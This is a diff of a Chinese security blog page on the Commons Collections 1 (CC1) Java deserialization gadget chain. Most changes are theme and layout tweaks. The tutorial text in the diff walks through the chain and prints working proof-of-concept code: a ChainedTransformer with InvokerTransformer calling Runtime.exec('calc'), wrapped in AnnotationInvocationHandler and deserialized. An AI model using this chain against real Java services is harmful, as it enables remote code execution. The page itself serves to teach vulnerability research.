@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>CC1链 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/24/CC1%E9%93%BE/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/24/CC1%E9%93%BE/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-24T04:06:01.000Z">2025.03.24</time></div>
-      <div><span>更新</span><time datetime="2025-03-24T04:06:01.000Z">2025.03.24</time></div>
-      <div><span>阅读</span><strong>30 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N9Uwl"><span class="toc-text">CC1链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mj2qI"><span class="toc-text">前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lXwnL"><span class="toc-text">CC1攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KsDgt"><span class="toc-text">危险方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#M9rlJ"><span class="toc-text">调用transform方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Svlmc"><span class="toc-text">调用checkSetValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PXS5a"><span class="toc-text">调用setValue</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IHp1B"><span class="toc-text">最后调整</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AGS9S"><span class="toc-text">一）Runtime类没有继承序列化接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#r10Sr"><span class="toc-text">二）中间由于存在if判断，并没有进入到if中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dhqWm"><span class="toc-text">三）readObject调用的setValue的参数值是固定的</span></a></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mj2qI"><span class="toc-text">前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lXwnL"><span class="toc-text">CC1攻击链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KsDgt"><span class="toc-text">危险方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#M9rlJ"><span class="toc-text">调用transform方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Svlmc"><span class="toc-text">调用checkSetValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PXS5a"><span class="toc-text">调用setValue</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IHp1B"><span class="toc-text">最后调整</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AGS9S"><span class="toc-text">一）Runtime类没有继承序列化接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#r10Sr"><span class="toc-text">二）中间由于存在if判断，并没有进入到if中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dhqWm"><span class="toc-text">三）readObject调用的setValue的参数值是固定的</span></a></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-24T04:06:01.000Z">2025.03.24</time></div>
+        <div><span>更新</span><time datetime="2025-03-24T04:06:01.000Z">2025.03.24</time></div>
+        <div><span>阅读</span><strong>约 11 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="N9Uwl">CC1链</h1>
+        
 <h2 id="mj2qI">前置基础</h2>
 
 <p><strong>Java反序列化原理：</strong></p>
@@ -125,14 +146,14 @@
 <li>不同类的同名函数</li>
 <li>任意方法调用（反射&#x2F;动态加载恶意字节码）</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png" alt="CC1链" loading="lazy"></p>
 <p><strong>注意：</strong></p>
 <p><strong>A ：可序列化</strong></p>
 <p><strong>重写readObject</strong></p>
 <p><strong>接受任意对象作为参数</strong></p>
 <p><strong>On : 可序列化</strong></p>
 <p><strong>集合类型&#x2F;接受Object&#x2F;接受Map</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png" alt="CC1链" loading="lazy"></p>
 <h2 id="lXwnL">CC1攻击链分析</h2>
 Transformer接口
 
@@ -216,28 +237,28 @@ Transformer接口
 <p>这里的name是get到我们之前Map中put进去键值对的<strong>key</strong>，然后去检查这个注解类中有没有这个<strong>key</strong>名字的参数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734604811567-b5fdc36b-d58b-4b4f-a1d5-3d4ce8164310.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734604811567-b5fdc36b-d58b-4b4f-a1d5-3d4ce8164310.png" alt="CC1链" loading="lazy"></p>
 <p>因此我们修改一下，在Target注解中存在一个value的参数，在Target注解中存在value名字的参数，只需要把put进去的key改为<strong>value</strong>，将Overide注解的类换为Target注解类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610450476-054512e5-220d-4d72-bcef-f81b7a37dda6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610450476-054512e5-220d-4d72-bcef-f81b7a37dda6.png" alt="CC1链" loading="lazy"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里可以看到已经memberType已经不为<strong>NULL</strong>了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610666424-0099b192-4b06-4e57-9f0f-7504adb1210a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610666424-0099b192-4b06-4e57-9f0f-7504adb1210a.png" alt="CC1链" loading="lazy"></p>
 <h3 id="dhqWm">三）readObject调用的setValue的参数值是固定的</h3>
 我们的本意是将setValue中的值改为Runtime.class，但是实际上我们无法修改其中的值，若我们可以控制，这条链就成功走通了
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611334368-9c073e9c-2fb0-48e3-bb5c-3dacd4b478a8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611334368-9c073e9c-2fb0-48e3-bb5c-3dacd4b478a8.png" alt="CC1链" loading="lazy"></p>
 <p>还有一个比较重要的类<code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">，下面为</font><code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">的构造函数和transform方法，构造时传入的参数设为一个常量值，后续调用他的transform方法，无论传入什么值，都会返回这个常量，如果我们在构造时传入 Runtime.class呢</font></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>现在只需要在Transformers的首位传入ConstantTransformer类，传入参数为Runtime的类，最后就能成功执行</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png" alt="CC1链" loading="lazy"></p>
 <p>大概的链子如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png" alt="CC1链" loading="lazy"></p>
 
       </div>
       
@@ -253,7 +274,7 @@ Transformer接口
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/03/24/CC1%E9%93%BE%E8%A1%A5%E5%85%85/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>CC1链补充</strong>
       </a>
     
@@ -268,9 +289,9 @@ Transformer接口
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
